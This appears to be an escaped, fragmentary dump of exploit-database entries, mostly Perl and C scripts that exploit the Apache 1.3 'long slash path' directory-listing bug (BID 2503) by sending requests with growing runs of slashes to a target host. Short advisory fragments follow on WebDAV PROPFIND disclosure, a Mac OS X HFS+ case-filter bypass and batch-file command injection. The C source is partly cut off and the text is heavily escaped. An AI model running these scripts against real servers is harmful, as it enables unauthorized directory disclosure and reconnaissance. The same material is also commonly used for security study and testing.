 print \\\'-R ##\  HTTP proxy port (default: 80)\\\',"\\\
";\\r\
 print \\\'-s\  use SSL (can\\\\\\\'t be used with proxy)\\\',"\\\
";\\r\
 exit 0;\\r\
}\\r\
\\r\
$low =  $args{L} || 1;\\r\
$high = $args{H} || 8192;\\r\
\\r\
&lw::http_init_request(\\\\%hin);\ \ # setup our request hash\\r\
\\r\
$hin{\\\'whisker\\\'}->{\\\'host\\\'}= $args{h};\\r\
\\r\
$hin{\\\'whisker\\\'}->{\\\'port\\\'}= $args{p} || 80;\\r\
\\r\
if(defined $args{s}){\\r\
 \ $hin{\\\'whisker\\\'}->{\\\'ssl\\\'} = 1; \\r\
\\r\
\ if(defined $args{P}){\\r\
\ \ print "SSL not currently compatible with proxy\\\
";\\r\
\ \ exit 1; \\r\
\ }\\r\
}\\r\
\\r\
if(defined $args{\\\'P\\\'}){\\r\
\ $hin{\\\'whisker\\\'}->{\\\'proxy_host\\\'}=$args{P};\\r\
\ $hin{\\\'whisker\\\'}->{\\\'proxy_port\\\'}=$args{R} || 80;\\r\
\ print "Using proxy host $hin{\\\'whisker\\\'}->{\\\'proxy_host\\\'} on ";\\r\
\ print "port $hin{\\\'whisker\\\'}->{\\\'proxy_port\\\'}\\\
";\\r\
}\\r\
\\r\
\\r\
&lw::http_fixup_request(\\\\%hin);\ \ # fix any HTTP requirements\\r\
\\r\
for($c=$low; $c<=$high; $c++){\\r\
\\r\
\ $hin{\\\'whisker\\\'}->{\\\'uri\\\'} = \\\'/\\\' x $c;\\r\
\\r\
\ if(&lw::http_do_request(\\\\%hin,\\\\%hout)){\\r\
\ \ print "Error: $hout{\\\'whisker\\\'}->{\\\'error\\\'}\\\
";\\r\
\ \ exit 1;\\r\
\ } else {\\r\
\ \ if($hout{\\\'whisker\\\'}->{\\\'http_resp\\\'} == 200 &&\\r\
\ \ \ $hout{\\\'whisker\\\'}->{\\\'data\\\'}=~/index of/i){\\r\
\\r\
\ \ \ print "Found result using $c slashes.\\\
";\\r\
\ \ \ exit 0;\\r\
\ \ }\\r\
\ }\\r\
\\r\
\ print "."; # for status\\r\
}\\r\
\\r\
print "\\\
Not vulnerable (perhaps try a different range).\\\
";\

20693.exploit title: Apache 1.3 - Artificially Long Slash Path Directory Listing (2)
20693.content:
\'// source: https://www.securityfocus.com/bid/2503/info\\r\
 \\r\
Apache HTTPD is the Apache Web Server, freely distributed and actively maintained by the Apache Software Foundation. It is a freely available and widely used software package, included with various implementations of the UNIX operating system and can be used on Microsoft Windows operating systems.\\r\
 \\r\
A problem in the package could allow directory indexing and path discovery. In a default configuration, Apache enables mod_dir, mod_autoindex, and mod_negotiation. However, by sending the Apache server a custom-crafted request consisting of a long path name created artificially by using numerous slashes, an attacker can cause these modules to misbehave, allowing the attacker to escape the error page and to gain a listing of the directory contents.\\r\
 \\r\
This vulnerability allows a malicious remote user to launch an information-gathering attack, which could potentially result in a compromise of the system. Additionally, this vulnerability affects all releases of Apache previous to 1.3.19. \\r\
\\r\
/*\\r\
Program: apacheslash.c\\r\
Original Date: 2-21-02\\r\
Version: 1.0\\r\
Platform: Linux (compiled on SuSE 7.3)\\r\
c0der: st0ic\\r\
site: www.fsix.net\\r\
e-mail: st0ic@blackcodemail.com\\r\
\\r\
Revised:\\r\
\ NONE thus far\\r\
\\r\
Description: This program tests an Apache installation for the "Apache Artificially Long Slash Path \\r\
Directory Listing Exploit."  See SecurityFocus.com BID 2503 - http://online.securityfocus.com/bid/2503 \\r\
\\r\
Compile: gcc apacheslash.c -o apacheslash\\r\
\\r\
Stuff: I know theres already 3 Perl scripts that test this bug out, but there execution time is horrible\\r\
so I was bored and decided to recode it in C for execution speed sake. On my box, I think it took\\r\
about 8 mins to send 1000 /\\\'s to apache with apache2.pl. It takes about 2 seconds with this program.\\r\
BTW, SuSE 7.3 comes with Apache 1.3.20, which is NOT vulnerable :-). Check out the securityfocus.com\\r\
BID 2503 to find out whats vulnerable and whats not.\\r\
\\r\
I also included the comments from apache2.pl exploit which was modified\\r\
by Siberian of sentry-labs.com. Read below for the details:\\r\
\\r\
/*************************************************\\r\
#!/usr/bin/perl\\r\
#\\r\
# orginal by farm9, Inc. (copyright 2001)\\r\
# new modified code by Siberian (www.sentry-labs.com)\\r\
#\\r\
########################################################################################\\r\
#\\r\
# Note: This isn\\\'t the orginal exploit! This one was modified and partly rewritten. \\r\
#\\r\
# Changes:\\r\
#\\r\
# - help added (more user firendly :-) )\\r\
# - messages added \\r\
# - exploit is now able to be executed on WinNT or 2k.\\r\
# - uses perl version of BSD sockets (compatible to Windows)\\r\
# \\r\
# Rewriter\\\'s Note: I rewrote (I was bored to death that evening :-) ) some\\r\
# of the code and made it esaier to use and cross platform compatible.\\r\
# The old verion used a esaier but not that compaible way of socket stream communication.  \\r\
# Any network code was replaced by cross platform compatible BSD sockets.\\r\
# (much better than any other stream method :-) )\\r\
# \\r\
# Tested with Perl 5.6 (Linux) and ActivePerl 5.6 (Win32)\\r\
#\\r\
# Original comment and source is attached below.\\r\
#\\r\
########################################################################################\\r\
#\\r\
# Name: Apache Artificially Long Slash Path Directory Listing Exploit\\r\
# Author: Matt Watchinski\\r\
# Ref: SecurityFocus BID 2503\\r\
#\\r\
# Affects: Apache 1.3.17 and below\\r\
# Tested on: Apache 1.3.12 running on Debian 2.2\\r\
#\\r\
# Info:  This exploit tricks apache into returning a Index of the a directory\\r\
#    even if an index.html file is present.  May not work on some OS\\\'s\\r\
#\\r\
# Details: http_request.c has a subroutine called ap_sub_req_lookup_file that in\\r\
#\    very specific cases would feed stat() a filename that was longer than\\r\
#\    stat() could handle.  This would result in a condition where stat()\\r\
#\    would return 0 and a directory index would be returned instead of the\\r\
#\    default index.html.\\r\
#\\r\
# Code Fragment: /src/main/http_request.c\\r\
#    if (strchr(new_file, \\\'/\\\') == NULL) {\\r\
#        char *udir = ap_make_dirstr_parent(rnew->pool, r->uri);\\r\
#\\r\
#        rnew->uri = ap_make_full_path(rnew->pool, udir, new_file);\\r\
#        rnew->filename = ap_make_full_path(rnew->pool, fdir, new_file);\\r\
#        ap_parse_uri(rnew, rnew->uri);    /* fill in parsed_uri values */\ /*\\r\
#        if (stat(rnew->filename, &rnew->finfo) < 0) {   <-- Important part\\r\
#            rnew->finfo.st_mode = 0;\\r\
#        }\\r\
#\\r\
# Conditions: Mod_dir / Mod_autoindex / Mod_negotiation need to be enabled\\r\
#\       The directory must also have the following Options enabled:\\r\
#             Indexes and MultiView\\r\
#\       Some OS\\\'s have different conditions on the number of character\\r\
#\       you have to pass to stat to make this work.  If stat doesn\\\'t\\r\
#\       return 0 for path names less than 8192 or so internal apache\\r\
#\       buffer checks will stop this exploit from working.\\r\
#\\r\
# \       Debian needed around 4060 /\\\'s to make this work.\\r\
#\\r\
# Greets: Special thanks to natasha who added a lot of debug to apache for me\\r\
#\   while i was trying to figure out what had to be enabled to make this\\r\
#\   exploit work.  Also thanks to rfp for pointing out that MultiView\\r\
#\   needed to be enabled.\\r\
#\\r\
# More Greets:  Jeff for not shooting me :) <All your Cisco\\\'s belong to us>\\r\
#               Anne for being so sexy <I never though corporate espionage\\r\
#                   would be so fun>\\r\
#               All my homies at farm9\\r\
#               DJ Charles / DJ NoloN for the phat beats\\r\
#               Marty (go go gadget snort)\\r\
#               All my ex-bees\\r\
#               RnVjazpIaXZlcndvcmxk\\r\
#\\r\
# I think that wraps it up.  Have fun.\\r\
-----snip snip----\\r\
**************************************************/\\r\
\\r\
#include <stdio.h>\\r\
#include <string.h>\\r\
#include <errno.h>\\r\
#include <stdlib.h>\\r\
#include <netdb.h>\\r\
#include <sys/types.h>\\r\
#include <sys/socket.h>\\r\
#include <netinet/in.h>\\r\
#include <unistd.h>\\r\
\\r\
char tmp[10240];\\r\
char output[10240];\\r\
char *get = "GET ";\\r\
char *slash = "/";\\r\
char *http = " HTTP/1.0\\\\r\\\
";\\r\
char *end = "\\\\r\\\
\\\\r\\\
";\\r\
int c, x;\\r\
int port;\\r\
int low;\\r\
int max;\\r\
int sockfd;\\r\
int bytes_recieved;\\r\
int count;\\r\
char *addr;\\r\
\\r\
struct sockaddr_in dest_addr;\\r\
struct hostent *he;\\r\
\\r\
void usage(char *ptr)\\r\
{\\r\
\ fprintf(stderr, "\\\
\\\ %s <-h host> <-p port> <-l LOW> <-m MAX>", ptr);\\r\
\ fprintf(stderr, "\\\
\\\ Example: %s -h 127.0.0.1 -p 80 -l 1 -m 1000\\\
", ptr);\\r\
\ fprintf(stderr, "\\\
\\\ LOW is how many /\\\'s to start with and MAX is how many /\\\'s to end with.\\\
\\\
");\\r\
\ exit(1);\\r\
}\\r\
\\r\
\\r\
int main(int argc, char *argv[])\\r\
{\\r\
\ printf("\\\
\\\ [       apacheslash.c     ]");\\r\
\ printf("\\\
\\\ [      c0ded by st0ic     ]");\\r\

\\\ [ st0ic@happyhack.zzn.com ]\\\
\\\
");\\r\
\\r\
\ while ( ( c = getopt(argc, argv, "h:p:l:m:") ) != -1)\\r\
\ {\\r\
\ \ switch(c)\\r\
\ \ {\\r\
\ \ \ case \\\'h\\\':\\r\
\ \ \ {\\r\
\ \ \ \ addr = optarg;\\r\
\ \ \ \ break;\\r\
\ \ \ }\\r\

\ }\\r\
\\r\
\ if ( low > max || addr == NULL )\\r\

\\r\
\ if ( (he = gethostbyname(addr)) == NULL)\\r\
\ {\\r\
\ \ perror("gethostbyname");\\r\
\ \ exit(1);\\r\

20694.exploit title: Apache 1.3 - Artificially Long Slash Path Directory Listing (3)
20694.content:
\'source: https://www.securityfocus.com/bid/2503/info\\r\
  \\r\
Apache HTTPD is the Apache Web Server, freely distributed and actively maintained by the Apache Software Foundation. It is a freely available and widely used software package, included with various implementations of the UNIX operating system and can be used on Microsoft Windows operating systems.\\r\
  \\r\
A problem in the package could allow directory indexing and path discovery. In a default configuration, Apache enables mod_dir, mod_autoindex, and mod_negotiation. However, by sending the Apache server a custom-crafted request consisting of a long path name created artificially by using numerous slashes, an attacker can cause these modules to misbehave, allowing the attacker to escape the error page and to gain a listing of the directory contents.\\r\
  \\r\
This vulnerability allows a malicious remote user to launch an information-gathering attack, which could potentially result in a compromise of the system. Additionally, this vulnerability affects all releases of Apache previous to 1.3.19.\\r\
\\r\
#!/usr/bin/perl\\r\
#\\r\
# farm9, Inc. (copyright 2001)\\r\
#\\r\
# Name: Apache Artificially Long Slash Path Directory Listing Exploit\\r\
# Author: Matt Watchinski\\r\
# Ref: SecurityFocus BID 2503\\r\
#\\r\
# Affects: Apache 1.3.17 and below\\r\
# Tested on: Apache 1.3.12 running on Debian 2.2\\r\
#\\r\
# Info:  This exploit tricks apache into returning a Index of the a directory\\r\
#    even if an index.html file is present.  May not work on some OS\\\'s\\r\
#\\r\
# Details: http_request.c has a subroutine called ap_sub_req_lookup_file that in\\r\
#\    very specific cases would feed stat() a filename that was longer than\\r\
#\    stat() could handle.  This would result in a condition where stat()\\r\
#\    would return 0 and a directory index would be returned instead of the\\r\
#\    default index.html.\\r\
#\\r\
# Code Fragment: /src/main/http_request.c\\r\
#    if (strchr(new_file, \\\'/\\\') == NULL) {\\r\
#        char *udir = ap_make_dirstr_parent(rnew->pool, r->uri);\\r\
#\\r\
#        rnew->uri = ap_make_full_path(rnew->pool, udir, new_file);\\r\
#        rnew->filename = ap_make_full_path(rnew->pool, fdir, new_file);\\r\
#        ap_parse_uri(rnew, rnew->uri);    /* fill in parsed_uri values */\\r\
#        if (stat(rnew->filename, &rnew->finfo) < 0) {   <-- Important part\\r\
#            rnew->finfo.st_mode = 0;\\r\
#        }\\r\
#\\r\
# Conditions: Mod_dir / Mod_autoindex / Mod_negotiation need to be enabled\\r\
#\       The directory must also have the following Options enabled:\\r\
#             Indexes and MultiView\\r\
#\       Some OS\\\'s have different conditions on the number of character\\r\
#\       you have to pass to stat to make this work.  If stat doesn\\\'t\\r\
#\       return 0 for path names less than 8192 or so internal apache\\r\
#\       buffer checks will stop this exploit from working.\\r\
#\\r\
# \       Debian needed around 4060 /\\\'s to make this work.\\r\
#\\r\
# Greets: Special thanks to natasha who added a lot of debug to apache for me\\r\
#\   while i was trying to figure out what had to be enabled to make this\\r\
#\   exploit work.  Also thanks to rfp for pointing out that MultiView\\r\
#\   needed to be enabled.\\r\
#\\r\
# More Greets:  Jeff for not shooting me :) <All your Cisco\\\'s belong to us>\\r\
#               Anne for being so sexy <I never though corporate espionage\\r\
#                   would be so fun>\\r\
#               All my homies at farm9\\r\
#               DJ Charles / DJ NoloN for the phat beats\\r\
#               Marty (go go gadget snort)\\r\
#               All my ex-bees\\r\
#               RnVjazpIaXZlcndvcmxk\\r\
#\\r\
# I think that wraps it up.  Have fun.\\r\
#\\r\
# Usage: ./apacheIndex.pl <host> <port> <HI> <Low>\\r\
# Where: Hi and low are the range for the number of / to try\\r\
#\\r\
\\r\
use IO::Socket;\\r\
\\r\
$low  = $ARGV[3]; #Low number of slash characters to try\\r\
$hi   = $ARGV[2]; #High number of slash characters to try\\r\
$port = $ARGV[1]; #Port to try to connect to\\r\
$host = $ARGV[0]; #Host to try to connect to\\r\
\\r\
# Main loop.  Not much to this exploit once you figure out what needed to\\r\
# be enabled.  Need to do some more testing on sub-dirs to see if it\\r\
# works with them.  It should. Also different OS\\\'s might use a different number\\r\
# of /.  Send me the numbers if you don\\\'t mind matt@farm9.com\\r\
\\r\
while($low <= $hi)\\r\
{\\r\
\\r\
$socket = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $port, Proto => "TCP") or die "Connect Failed";\\r\
\\r\
  $url = "";\\r\
  $buffer = "";\\r\
  $end = "";\\r\
\\r\
  $url = "GET ";\\r\
  $buffer = "/" x $low . " HTTP/1.0\\\\r\\\
";\\r\
  $end = "\\\\r\\\
\\\\r\\\
";\\r\
\\r\
  $url = $url . $buffer . $end;\\r\
\\r\
  print $socket "$url";\\r\
  while(<$socket>)\\r\
  {\\r\
    if($_ =~ "Index of")\\r\
    {\\r\
      print "Found the magic number: $low\\\
";\\r\
      print "Now go do it by hand to to see it all\\\
";\\r\
      close($socket);\\r\
      exit;\\r\
    }\\r\
  }\\r\
\\r\
  close($socket);\\r\
  $low++;\\r\
}\

\'source: https://www.securityfocus.com/bid/1656/info\\r\
\\r\
WebDAV (Web Distributed Authoring and Versioning) is an extension of HTTP which allows users to create, edit and share documents using the HTTP protocol. A particular REQUEST METHOD, PROPFIND, allows users to retrieve resource properties such as displayname, date last modified, and others. Apache web server as installed by SuSE 6.4 has WebDAV enabled for the entire file structure of the server. By making a specific, properly structured request to the Apache web server, it is possible to obtain information which is equivalent to a directory listing.\\r\
\\r\

20911.content:
\'source: https://www.securityfocus.com/bid/2852/info\\r\
\\r\
A vulnerability exists when Apache webserver is used with Mac OS X Client.\\r\
\\r\
The standard filesystem for Mac OS X is HFS+. HFS+ is case insensitive while Apache\\\'s filtering is case sensitive. The result is that Apache will filter all file requests that match filters exactly (including case), but it will not filter requests made with mixed or upper case characters. Since HFS+ is case insensitive, these requests will result in the "filtered" files being disclosed.\\r\
\\r\
The impact is that arbitrary privileged files may be disclosed to unprivileged remote users. \\r\
\\r\
The following request will result in a 403 Forbidden as excpected:\\r\
\\r\
GET /test/index.html\\r\
\\r\
But the following request will happily serve the file:\\r\

Special characters (such as |) may not be filtered by the batch file handler when a web request is made for a batch file. As a result, a remote attacker may be able to execute arbitrary commands on the host running the vulnerable software.\\r\
\\r\
It should be noted that webservers on Windows operating systems normally run with SYSTEM privileges.\\r\
